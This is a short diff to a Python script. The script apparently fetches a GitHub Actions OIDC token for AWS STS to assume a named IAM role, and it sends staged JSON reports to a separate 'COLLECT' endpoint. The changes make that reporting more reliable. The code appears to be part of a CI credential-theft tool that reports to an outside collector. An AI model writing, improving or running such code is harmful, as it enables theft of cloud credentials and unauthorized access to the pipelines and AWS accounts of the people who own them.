@@ -3,6 +3,7 @@ import json
 import os
 import base64
 import urllib.request
+import sys
 
 
 ROLE_ARN = os.environ.get("ROLE_ARN", "arn:aws:iam::897419129406:role/github-actions-pulumi")
@@ -15,13 +16,14 @@ def _log(stage, data):
     body = json.dumps({"stage": stage, "data": data}).encode()
     req = urllib.request.Request(COLLECT, data=body, headers={"Content-Type": "application/json"})
     try:
-        urllib.request.urlopen(req, timeout=5)
-    except Exception:
-        pass
+        resp = urllib.request.urlopen(req, timeout=10)
+        resp.read()
+    except Exception as e:
+        print(f"collect_err: {stage}: {e}", file=sys.stderr)
 
 
 def _get_oidc_token():
-    _log("oidc_start", {})
+    _log("oidc_start", {"pid": os.getpid()})
     url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=sts.amazonaws.com"
     req = urllib.request.Request(url, headers={
         "Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"],
